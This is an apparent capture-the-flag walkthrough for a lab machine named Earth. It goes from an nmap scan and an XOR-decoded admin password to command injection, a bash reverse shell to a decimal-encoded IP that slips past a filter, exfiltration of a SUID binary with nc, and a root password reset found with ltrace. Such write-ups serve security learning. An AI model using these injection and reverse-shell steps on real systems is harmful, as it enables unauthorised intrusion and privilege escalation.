Initial nmap scan shows ports
    22
    80 - runs a web server
    443

Some dns records which we add to our /etc/hosts
    earth.local
    terratest.earth.local

found robots.txt in https://terratest.earth.local/robots.txt

A file name
    /testingnotes.*
    some file extensions are also included

Found a username for admin portal in testingnotes.txt
    username : terra
    password :

"Using XOR encryption as the algorithm" gives us a hint of the encrypted messages on earth.local
A file textdata.txt is also found and it contains plain message i.e 'Test encryption' as notes say.

We decode the message from hex then from XOR using the testdata.txt as the key...
    We get ```earthclimatechangebad4humans``` we assume it is the password.

Running dirsearch to find the path to admin portal...
    http://earth.local/admin

Looks like a cli interface... Lets try command injection
After a few enum, we cant do much as a user apache
Remote urls are filterd when i tried to ping my machine, lest encode to sth like binary or decimal
    Using cyberchef
    192.168.43.94 - 3232246622

    'bash -i >& /dev/tcp/3232246622/4444 0>&1'
Throw that to the input and listen to port 4444
    nc -nlvp 4444

Enum and we find a certain suid binary - lets cp to our machine and inspect it further
    bash$ nc -w 3 192.168.56.1 4445 < reset_root
    root@kali~: nc -lnvp 4445 > reset_root

running strings to the file shows sth about resetting root password to 'Earth' on some conditions.
Enough googling I stubbled upon ltrace which records library calls
    root@kali~: ltrace ./root_reset

several things popped, the conditions some files that were needed for the reset_root to execute
I created the files...
Then execute the reset_root and the pass was changed.
    su root
    cat root_flag.txt
    [root_flag_b0da9554d29db2117b02aa8b66ec492e]
